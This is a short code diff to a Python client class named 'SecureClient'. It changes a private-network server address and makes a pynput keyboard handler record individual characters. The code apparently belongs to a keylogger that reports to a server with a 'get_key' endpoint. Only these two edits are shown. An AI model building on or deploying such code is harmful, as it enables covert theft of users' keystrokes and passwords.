@@ -8,7 +8,7 @@ from pynput import keyboard
 
 class SecureClient:
     def __init__(self):
-        self.server_ip = "192.168.0.8"
+        self.server_ip = "192.168.204.129"
         self.server_port = 5555
         self.server_url = f"http://{self.server_ip}:5000/get_key"
 
@@ -42,7 +42,7 @@ class SecureClient:
 
         def on_press(key):
             try:
-                char = str(key)
+                char = key.char
             except AttributeError:
                 char = str(key)
 
